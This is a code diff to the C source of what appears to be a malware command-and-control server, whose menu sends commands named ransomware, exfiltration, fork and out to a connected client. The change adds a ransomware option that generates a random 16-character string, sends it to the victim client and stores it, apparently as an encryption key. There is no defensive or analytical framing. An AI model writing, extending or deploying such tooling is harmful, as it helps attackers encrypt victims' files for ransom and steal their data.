@@ -81,10 +81,11 @@ int main()
         while (1)
         {
             printf("\nSelect a command to send to the client:\n");
-            printf("1. exfiltration\n");
-            printf("2. fork\n");
-            printf("3. out\n");
-            printf("4. quit (disconnect client)\n");
+            printf("1. ransomware\n");
+            printf("2. exfiltration\n");
+            printf("3. fork\n");
+            printf("4. out\n");
+            printf("5. quit (disconnect client)\n");
             printf("Choice: ");
 
             int choice;
@@ -97,6 +98,10 @@ int main()
             {
             case 1:
                 command = "ransomware";
+                char *random_string = gener(16);
+                send(client_fd, random_string, strlen(random_string), 0);
+                stock (random_string,buffer);
+
                 break;
             case 2:
                 command = "exfiltration";
